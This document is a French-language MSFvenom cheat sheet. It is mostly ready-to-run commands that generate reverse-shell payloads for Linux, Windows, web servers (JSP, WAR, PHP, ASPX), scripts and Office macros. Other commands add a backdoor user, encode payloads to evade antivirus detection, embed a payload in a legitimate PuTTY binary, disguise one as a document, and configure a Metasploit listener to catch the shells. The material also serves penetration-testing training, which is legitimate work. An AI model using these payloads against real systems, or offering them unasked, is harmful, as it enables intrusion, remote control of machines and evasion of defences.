# Création avec MSFvenom

MSFvenom est un outil puissant qui combine les fonctionnalités de Msfpayload et Msfencode. Il permet de générer des payloads encodés pour contourner les systèmes de détection.

## Concepts Fondamentaux

### Staged vs Stageless

**Payloads Staged** (`windows/shell/reverse_tcp`)
- Envoi d'un petit "stager" initial
- Téléchargement du payload complet en second temps
- Plus léger, mais nécessite une connexion stable
- Format: `<plateforme>/<shell>/<transport>`

**Payloads Stageless** (`windows/shell_reverse_tcp`)
- Envoi du payload complet en une fois
- Fonctionne dans des environnements plus restrictifs
- Plus lourd mais plus fiable
- Format: `<plateforme>/<shell>_<transport>`

### Lister les Payloads Disponibles

```bash
# Lister tous les payloads
msfvenom -l payloads

# Filtrer par type
msfvenom -l payloads | grep "windows"
msfvenom -l payloads | grep "reverse_tcp"
```

## Création de Payloads pour Différentes Plateformes

### Linux

```bash
# Stageless reverse shell ELF binaire
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f elf > shell.elf

# Stageless reverse shell - Format C
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f c > shell.c

# Utilisateur Linux
msfvenom -p linux/x64/adduser USER=hacker PASS=password -f elf > adduser.elf
```

### Windows

```bash
# Stageless reverse shell - Exécutable
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe > shell.exe

# Staged reverse shell - Exécutable
msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe > staged-shell.exe

# Encodage pour éviter les détections (plusieurs passes)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -e x64/shikata_ga_nai -i 10 -f exe > encoded-shell.exe

# Format DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f dll > shell.dll

# Format MSI (Windows Installer)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f msi > shell.msi
```

### Web Payloads

```bash
# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f raw > shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f war > shell.war

# PHP
msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=443 -f raw > shell.php

# ASP
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f asp > shell.asp

# ASPX
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f aspx > shell.aspx
```

### Payloads Scriptes

```bash
# Python
msfvenom -p cmd/unix/reverse_python LHOST=10.10.10.10 LPORT=443 -f raw > shell.py

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.10.10 LPORT=443 -f raw > shell.sh

# Perl
msfvenom -p cmd/unix/reverse_perl LHOST=10.10.10.10 LPORT=443 -f raw > shell.pl

# PowerShell
msfvenom -p cmd/windows/powershell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f raw > shell.ps1
```

### Scripts pour Office/Macro

```bash
# Macro VBA pour Office
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f vba -o macro.vba

# HTA (HTML Application)
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f hta-psh > shell.hta
```

## Encodage et Contournement

### Options d'Encodage

```bash
# Lister les encodeurs disponibles
msfvenom -l encoders

# Shikata Ga Nai (populaire pour Windows)
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -e x86/shikata_ga_nai -i 9 -f exe > encoded.exe

# Éviter les mauvais caractères
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -b "\x00\x0a\x0d" -f exe > no-badchars.exe
```

### Techniques Avancées

```bash
# Ajout d'un template (binaire légitime)
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -x /path/to/putty.exe -f exe > putty-trojan.exe

# Intégration dans des formats non suspicieux
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -e x86/shikata_ga_nai -i 9 -f vbs -o convincing-doc.vbs
```

## Utilisation avec Metasploit Framework

### Gestionnaire multi/handler

```bash
# Configuration dans msfconsole
use exploit/multi/handler
set PAYLOAD <payload_matching_generated>
set LHOST 10.10.10.10
set LPORT 443
run
```

### Exécution automatisée

```bash
# Création d'un script RC
echo "use exploit/multi/handler" > handler.rc
echo "set PAYLOAD windows/x64/shell_reverse_tcp" >> handler.rc
echo "set LHOST 10.10.10.10" >> handler.rc
echo "set LPORT 443" >> handler.rc
echo "run -j" >> handler.rc

# Exécution
msfconsole -r handler.rc
```

## Astuces Pratiques

1. **Désactiver le handler MSF après utilisation** pour libérer le port
2. **Tester les payloads dans un environnement contrôlé** avant déploiement
3. **Utiliser des formats appropriés à la cible** (exe pour Windows, elf pour Linux)
4. **Varier les ports** (443, 80, 53) pour éviter les filtres réseau
5. **Signature Check**: `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe -o shell.exe && virustotal-cli shell.exe`